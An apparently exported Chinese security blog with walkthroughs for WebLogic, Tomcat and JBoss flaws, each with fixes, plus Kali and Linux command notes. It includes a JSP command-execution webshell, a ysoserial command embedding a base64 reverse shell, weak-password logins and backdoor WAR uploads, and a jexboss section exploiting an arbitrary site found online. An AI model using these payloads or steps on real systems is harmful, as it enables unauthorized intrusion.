<h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。</p>
<h5 id="2-漏洞复现-1"><a href="#2-漏洞复现-1" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>访问<a href="http://192.168.139.129:7001/ws_utc/config.do。" target="_blank" rel="noopener">http://192.168.139.129:7001/ws_utc/config.do。</a></p>
<p><a href="https://image.3001.net/images/20181216/1544955408_5c162610d485e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955408_5c162610d485e.png!small" alt="img"></a></p>
<p>设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。</p>
<p>然后点击安全 -&gt; 增加，然后上传 webshell ，这里我上传一个 jsp 大马。</p>
<p><a href="https://image.3001.net/images/20181216/1544955420_5c16261c14846.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955420_5c16261c14846.png!small" alt="img"></a></p>
<p>上传后，查看返回的数据包，其中有时间戳：</p>
<p><a href="https://image.3001.net/images/20181216/1544955428_5c16262471d61.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955428_5c16262471d61.png!small" alt="img"></a></p>
<p>可以看到时间戳为1543145154632。</p>
<p>访问<a href="http://192.168.139.129:7001/ws_utc/css/config/keystore/1543145154632_lele.jsp。" target="_blank" rel="noopener">http://192.168.139.129:7001/ws_utc/css/config/keystore/1543145154632_lele.jsp。</a></p>
<p>可以进行文件管理、文件上传、系统命令执行等。</p>
<p><a href="https://image.3001.net/images/20181216/1544955438_5c16262ed74a2.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955438_5c16262ed74a2.png!small" alt="img"></a></p>
<p>尝试以下执行系统命令。</p>
<p><a href="https://image.3001.net/images/20181216/1544955446_5c16263615970.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955446_5c16263615970.png!small" alt="img"></a></p>
<p>命令执行成功。</p>
<p><strong>3.漏洞修复</strong></p>
<p>方案1：</p>
<p>使用Oracle官方通告中的补丁链接：</p>
<p><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></p>
<p><a href="https://support.oracle.com/rs?type=doc&amp;id=2394520.1" target="_blank" rel="noopener">https://support.oracle.com/rs?type=doc&amp;id=2394520.1</a></p>
<p>方案2:</p>
<p>1）进入Weblogic Server管理控制台；</p>
<p>2）domain设置中，启用”生产模式”。</p>
<h4 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h4><h5 id="1-漏洞原理：-1"><a href="#1-漏洞原理：-1" class="headerlink" title="1.漏洞原理："></a>1.漏洞原理：</h5><p>由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。</p>
<h5 id="2-漏洞复现-2"><a href="#2-漏洞复现-2" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>访问<a href="http://192.168.139.129:7001/console" target="_blank" rel="noopener">http://192.168.139.129:7001/console</a></p>
<p><a href="https://image.3001.net/images/20181216/1544955458_5c162642c59ac.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955458_5c162642c59ac.png!small" alt="img"></a></p>
<p>使用弱口令登陆至后台。</p>
<p>点击锁定并编辑。</p>
<p><a href="https://image.3001.net/images/20181216/1544955467_5c16264b0e5ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955467_5c16264b0e5ed.png!small" alt="img"></a></p>
<p>选择部署，进一步点击右边的安装。</p>
<p><a href="https://image.3001.net/images/20181216/1544955476_5c162654ad096.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955476_5c162654ad096.png!small" alt="img"></a></p>
<p>点击上传文件 — 进入文件上传界面，选择要上传的 war 包。</p>
<p><a href="https://image.3001.net/images/20181216/1544955485_5c16265d47acf.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955485_5c16265d47acf.png!small" alt="img"></a></p>
<p>进入下一步，选择对应的 war 包进行部署，下一步下一步直至完成。</p>
<p><a href="https://image.3001.net/images/20181216/1544955495_5c16266778cf9.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955495_5c16266778cf9.png!small" alt="img"></a></p>
<p><a href="https://image.3001.net/images/20181216/1544955518_5c16267e4cdda.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955518_5c16267e4cdda.png!small" alt="img"></a></p>
<p><a href="https://image.3001.net/images/20181216/1544955523_5c1626831e3b3.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955523_5c1626831e3b3.png!small" alt="img"></a></p>
<p>点击激活更改。</p>
<p><a href="https://image.3001.net/images/20181216/1544955531_5c16268b6846b.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955531_5c16268b6846b.png!small" alt="img"></a></p>
<p>启动上传的 war 包所生成的服务。</p>
<p><a href="https://image.3001.net/images/20181216/1544955539_5c16269393d67.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955539_5c16269393d67.png!small" alt="img"></a></p>
<p>拿到 webshell。</p>
<p><a href="https://image.3001.net/images/20181216/1544955547_5c16269badc78.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955547_5c16269badc78.png!small" alt="img"></a></p>
<p><strong>3、 漏洞修复</strong></p>
<p>防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。</p>
]]></content>
  </entry>
  <entry>
    <title>Tomcat中间件漏洞</title>
    <url>/2020/04/03/tomcat-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="Tomcat中间件漏洞复现"><a href="#Tomcat中间件漏洞复现" class="headerlink" title="Tomcat中间件漏洞复现"></a>Tomcat中间件漏洞复现</h2><h4 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h4><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
<h4 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p>
<p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p>
<h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>配置漏洞，开启put方法可上传文件功能。</p>
<p>tomcat文件夹下的/conf/web.xml文件插入：</p>
<pre><code>     &lt;init-param&gt;           &lt;param-name&gt;readonly&lt;/param-name&gt;           &lt;param-value&gt;false&lt;/param-value&gt;     &lt;/init-param&gt;</code></pre><p>重启tomcat服务。</p>
<p><a href="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png!small" alt="img"></a></p>
<p>访问127.0.0.1：8080，burp抓包，send to Repeater，将请求方式改为PUT，创建一个122.jsp，并用%20转义空格字符。123.jsp内容为：</p>
<pre><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%</code></pre><p>返回201，说明创建成功。</p>
<p><a href="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png!small" alt="img"></a></p>
<p>访问127.0.0.1：8080/122.jsp?cmd=calc。</p>
<p>弹出计算器：</p>
<p><a href="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png!small" alt="img"></a></p>
<p><strong>3、 漏洞修复</strong></p>
<p>1）检测当前版本是否在影响范围内，并禁用PUT方法。</p>
<p>2）更新并升级至最新版。</p>
<h3 id="（三）war后门文件部署"><a href="#（三）war后门文件部署" class="headerlink" title="（三）war后门文件部署"></a>（三）war后门文件部署</h3><p><strong>1、漏洞简介及成因</strong></p>
<p>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
<p>若后台管理页面存在弱口令，则可以通过爆破获取密码。</p>
<p><strong>2、漏洞复现</strong></p>
<p>Tomcat安装目录下conf里的tomcat-users.xml配置如下：</p>
<p><a href="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png!small" alt="img"></a></p>
<p>访问后台，登陆：</p>
<p><a href="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png!small" alt="img"></a></p>
<p>上传一个war包，里面是jsp后门：</p>
<p><a href="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png!small" alt="img"></a></p>
<p>成功上传并解析，打开：</p>
<p><a href="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png!small" alt="img"></a></p>
<p>可执行系统命令：</p>
<p><a href="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png!small" alt="img"></a></p>
<p>也可进行文件管理，任意查看、删除、上传文件：</p>
<p><a href="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png!small" alt="img"></a></p>
<p><strong>3、漏洞修复</strong></p>
<p>1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p>
<p>2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。</p>
<p>3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。</p>
<p>4）后台管理避免弱口令。</p>
]]></content>
  </entry>
  <entry>
    <title>jBoss中间件漏洞</title>
    <url>/2020/04/03/jboss-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="jBoss中间件漏洞复现"><a href="#jBoss中间件漏洞复现" class="headerlink" title="jBoss中间件漏洞复现"></a>jBoss中间件漏洞复现</h2><h4 id="jBoss简介"><a href="#jBoss简介" class="headerlink" title="jBoss简介"></a>jBoss简介</h4><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<h4 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</h4><p>这里直接复制了官方文档复现：<a href="https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149</a></p>
<p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
<p>参考：</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg</a></li>
<li><a href="https://access.redhat.com/security/cve/cve-2017-12149" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2017-12149</a></li>
</ul>
<h5 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h5><p>运行测试环境</p>
<pre><code>docker-compose up -d</code></pre><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到JBoss默认页面。</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化：</p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/1.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/1.png" alt="img"></a></p>
<p>所以，我们用常规Java反序列化漏洞测试方法来复现该漏洞。</p>
<p><strong>编写反弹shell的命令</strong></p>
<p>我们使用bash来反弹shell，但由于<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，我们需要用进行一次编码。</p>
<p>工具：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/2.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/2.png" alt="img"></a></p>
<p><strong>序列化数据生成</strong></p>
<p>使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：</p>
<pre><code>java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx}|{base64,-d}|{bash,-i}&quot; &gt; poc.ser</code></pre><p><strong>发送POC</strong></p>
<p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可：</p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/3.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/3.png" alt="img"></a></p>
<p>成功反弹shell：</p>
<p><a href="https://github.com/vulhub/vulhub/blob/master/jboss/CVE-2017-12149/img/4.png" target="_blank" rel="noopener"><img src="https://github.com/vulhub/vulhub/raw/master/jboss/CVE-2017-12149/img/4.png" alt="img"></a></p>
<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p>网上已经有很多EXP了，比如<a href="https://cdn.vulhub.org/deserialization/DeserializeExploit.jar" target="_blank" rel="noopener">DeserializeExploit.jar</a></p>
<h5 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3 漏洞修复"></a>3 漏洞修复</h5><p>有效解决方案：升级到JBOSS AS7版本临时解决方案：</p>
<p>1）不需要http-invoker.sar 组件的用户可直接删除此组件；</p>
<p>2）用于对 httpinvoker 组件进行访问控制。</p>
<h4 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。</p>
<p><strong>弱口令/未授权访问：</strong></p>
<p>admin/admin</p>
<p><strong>2、 漏洞复现</strong></p>
<p><a href="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955269_5c16258565dca.png!small" alt="img"></a></p>
<p><a href="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955275_5c16258b733e0.png!small" alt="img"></a></p>
<p>点击Web Application(war)s。</p>
<p><a href="https://image.3001.net/images/20181216/1544955283_5c16259340980.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955283_5c16259340980.png!small" alt="img"></a></p>
<p>点击add a new resource。</p>
<p><a href="https://image.3001.net/images/20181216/1544955291_5c16259b4b362.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955291_5c16259b4b362.png!small" alt="img"></a></p>
<p>选择一个war包上传，上传后，进入该war包，点击start。</p>
<p><a href="https://image.3001.net/images/20181216/1544955300_5c1625a46f26a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955300_5c1625a46f26a.png!small" alt="img"></a></p>
<p>查看status为sucessful。</p>
<p><a href="https://image.3001.net/images/20181216/1544955310_5c1625ae165ad.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955310_5c1625ae165ad.png!small" alt="img"></a></p>
<p>访问该war包页面，进入后门。</p>
<p>可进行文件管理和系统命令执行。</p>
<p><a href="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955318_5c1625b6d0f4c.png!small" alt="img"></a></p>
<p><a href="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955328_5c1625c0579fd.png!small" alt="img"></a></p>
<h3 id="使用kali复现"><a href="#使用kali复现" class="headerlink" title="使用kali复现"></a>使用kali复现</h3><p>参考链接：<a href="https://blog.csdn.net/u011215939/article/details/79141624" target="_blank" rel="noopener">https://blog.csdn.net/u011215939/article/details/79141624</a></p>
<p>所需工具：kallinux，jexboss，</p>
<p>获取工具：打开kalilinux，在kali终端中输入以下命令：</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTA4OTMxLTc1MzA2MTk4My5wbmc=.jpg" alt="img"></p>
<p>下载完成</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTAzNTExLTEwNzkzNTY3MDgucG5n.jpg" alt="img"></p>
<p>运行 python jexboss.py</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTQ5MzQ5LTE3NjgzMDY3ODYucG5n.jpg" alt="img"></p>
<p>检验是否能够执行，可以执行就是如下：</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNTU5OTYwLTE2OTMyNzM0OTEucG5n.jpg" alt="img"></p>
<p>找一个jboos的网站，如图所示</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjA2Mjg0LTE1MzU0ODQxNTQucG5n.jpg" alt="img"></p>
<p>将这个IP:8080复制到kalilinux中使用jexboss工具进行检测；</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjQxMzA5LTE5MDI1MDExMzQucG5n.jpg" alt="img"></p>
<p>执行,工具会依次检测一下项目，有漏洞就会显示红色的：VULNERABLE(易受攻击的)，工具就会根据找到容易受到攻击的点，进行利用</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjQ5Njg0LTExNTA3Njc2MTcucG5n.jpg" alt="img"></p>
<p>然后选择yes，开始创建连接；</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNjU3MTAwLTc0Nzg5ODU1Ni5wbmc=.jpg" alt="img"></p>
<p>返回信息显示连接成功了；</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzA0NzI2LTQ5ODI4NTQ5My5wbmc=.jpg" alt="img"></p>
<p>现在获取了shell，开始执行shell命令了；返回的信息显示，这是一个linux操作系统；</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzEzMzI0LTIwNzE4NzEyOTgucG5n.jpg" alt="img"></p>
<p>执行几条命令看看； root权限</p>
<p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xNjc0NDYzLzIwMTkwOS8xNjc0NDYzLTIwMTkwOTE5MjExNzIxMzA2LTUzNzY3MDMxMy5wbmc=.jpg" alt="img"></p>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://www.bbsmax.com/A/WpdK3MwrdV/" target="_blank" rel="noopener">https://www.bbsmax.com/A/WpdK3MwrdV/</a></p>
<p><a href="https://www.bbsmax.com/A/WpdK3MwrdV/" target="_blank" rel="noopener">https://www.bbsmax.com/A/WpdK3MwrdV/</a></p>
<p><a href="https://www.freebuf.com/articles/web/192063.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192063.html</a></p>
]]></content>
      <categories>
        <category>中间件漏洞</category>
      </categories>
      <tags>
        <tag>JBoss中间件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>kali linux安装相关知识</title>
    <url>/2020/03/12/linux-an-zhuang/</url>
    <content><![CDATA[<h3 id="kali-linux安装部分相关知识"><a href="#kali-linux安装部分相关知识" class="headerlink" title="kali linux安装部分相关知识"></a>kali linux安装部分相关知识</h3><h4 id="kali安装"><a href="#kali安装" class="headerlink" title="kali安装"></a>kali安装</h4><h5 id="硬盘安装"><a href="#硬盘安装" class="headerlink" title="硬盘安装"></a>硬盘安装</h5><ul>
<li><p>下载安装镜像</p>
<p><a href="https://www.kali.org/downloads" target="_blank" rel="noopener">https://www.kali.org/downloads</a></p>
</li>
<li><p>验证hash值</p>
</li>
<li><p>制作启动光盘</p>
<p>live</p>
</li>
<li><p>制作启动U盘</p>
</li>
<li><p>设置BIOS启动顺序</p>
</li>
<li><p>启动安装</p>
</li>
</ul>
<h5 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h5><ul>
<li>虚拟化和Docker</li>
<li>kali Docker image<ul>
<li><a href="https://www.kali.org/news/official-kali-linux-docker-images/" target="_blank" rel="noopener">https://www.kali.org/news/official-kali-linux-docker-images/</a></li>
<li><a href="https://github.com/offensive-security/kali-linux-docker" target="_blank" rel="noopener">https://github.com/offensive-security/kali-linux-docker</a></li>
</ul>
</li>
</ul>
<h5 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h5><ul>
<li>官方VM镜像</li>
<li>vmware workstation</li>
<li>virtualBox<ul>
<li>下载、安装、扩展工具、基本使用</li>
<li>win8系统</li>
<li>安装kali</li>
<li>安装tools</li>
</ul>
</li>
</ul>
<h4 id="熟悉环境"><a href="#熟悉环境" class="headerlink" title="熟悉环境"></a>熟悉环境</h4><ul>
<li>登录密码</li>
<li>TOP 10安全工具</li>
<li>字体调整</li>
<li>强行终止程序</li>
<li>文件目录</li>
<li>共享文件</li>
</ul>
<h4 id="常见linux命令"><a href="#常见linux命令" class="headerlink" title="常见linux命令"></a>常见linux命令</h4><p>*<em>chmod *</em>控制文件如何被他人所调用</p>
<ul>
<li><p>​    u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</p>
</li>
<li><p>+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。</p>
</li>
<li><p>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。</p>
<p>数字来表示权限</p>
</li>
</ul>
<p>​    r=4,w=2,x=1</p>
<ul>
<li>若要rwx属性则4+2+1=7；</li>
<li>若要rw-属性则4+2=6；</li>
<li>若要r-x属性则4+1=5。<ul>
<li>​    chmod ugo+r test.txt ，chmod a+r file1.txt  #将文件设为所有人皆可读取</li>
<li>chmod 777 test.txt  #用数字来表示权限</li>
</ul>
</li>
</ul>
<p><strong>ls</strong> 显示目录下文件 </p>
<ul>
<li>-l    列出文件详细信息</li>
<li>-a   列出当前目录下所有文件及目录，包括隐藏文件</li>
</ul>
<p><strong>mkdir</strong> 创建目录</p>
<ul>
<li>-p 创建目录，若无父目录，则创建p(parent)</li>
</ul>
<p><strong>pwd</strong> 查看当前工作目录</p>
<p><strong>cp</strong>:复制文件</p>
<p><strong>cd</strong> #切换目录</p>
<ul>
<li>cd ~ #跳到自己的home目录</li>
</ul>
<p><strong>touch:</strong>创建空文件</p>
<p><strong>echo:</strong>创建带有内容的文件</p>
<p><strong>cat</strong> 查看文件内容</p>
<ul>
<li>n 或 –number：由 1 开始对所有输出的行数编号。</li>
<li>-b 或 –number-nonblank：和 -n 相似，只不过对于空白行不编号。</li>
<li>-s 或 –squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行。</li>
<li>-v 或 –show-nonprinting：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外。</li>
<li>-E 或 –show-ends : 在每行结束处显示 $。</li>
<li>-T 或 –show-tabs: 将 TAB 字符显示为 ^I。</li>
<li>-A, –show-all：等价于 -vET。</li>
<li>-e：等价于”-vE”选项；</li>
<li>-t：等价于”-vT”选项；</li>
</ul>
<p><strong>fInd</strong>  在文件系统中搜索某文件</p>
<ul>
<li>​    find / name <em>xxx\</em>.c  #模糊查找目录下的文件<ul>
<li>​    find /var/log -type f -mtime +7  -ok rm {} \  #查找/var/log目录中更改时间在7日以前的普通文                                                                                    件，并在删除之前询问它们： </li>
<li>find . -type f -perm 644 -exec ls -l {} \   #查找前目录中文件属主具有读写权限                                                                    </li>
</ul>
</li>
</ul>
<p><strong>wc</strong> 统计文本中行数、字数、字符数</p>
<p><strong>grep</strong> 在文本文件中查找某个字符串</p>
<ul>
<li>grep “被查找的字符串“ 文件名</li>
<li>grep  -e “正则表达式“ 文件名</li>
<li>grep -i  “被查找的字符串” 文件名    #忽略大小写</li>
</ul>
<p><strong>pwd</strong> 显示当前目录</p>
<p><strong>more less</strong> 分页显示文本文件内容</p>
<p><strong>head tail</strong> 显示文件头、尾内容</p>
<p><strong>mv</strong> 移动或重命名</p>
<p><strong>us</strong> #切换管理员目录</p>
<p><strong>./文件名</strong>  #执行文件</p>
<p><strong>rm</strong> 文件名 #删除文件</p>
<p><strong>rm -r</strong> 文件夹名 #删除文件夹</p>
<h5 id="二、Linux系统管理命令"><a href="#二、Linux系统管理命令" class="headerlink" title="二、Linux系统管理命令"></a>二、Linux系统管理命令</h5><p><strong>chmod</strong>控制文件如何被他人所调用。</p>
<p><strong>stat</strong>        显示指定文件的详细信息，比ls更详细</p>
<p><strong>who</strong>        显示在线登陆用户</p>
<p><strong>whoami</strong>      显示当前操作用户</p>
<p><strong>hostname</strong>    显示主机名</p>
<p><strong>uname</strong>      显示系统信息</p>
<p><strong>top</strong>         动态显示当前耗费资源最多进程信息</p>
<p><strong>ps</strong>          显示瞬间进程状态 ps -au</p>
<ul>
<li>ps -A    #显示进程信息</li>
<li>ps -u root     #显示root用户进程信息</li>
<li>ps -aux      # 显示所有包含其他使用者的行程</li>
</ul>
<p><strong>du</strong>          查看目录大小 du -h /home带有单位显示目录信息</p>
<p><strong>df</strong>          查看磁盘大小 df -h 带有单位显示磁盘信息</p>
<p><strong>ifconfig</strong>      查看网络情况</p>
<p><strong>ping</strong>         测试网络连通</p>
<p><strong>netstat</strong>      显示网络状态信息</p>
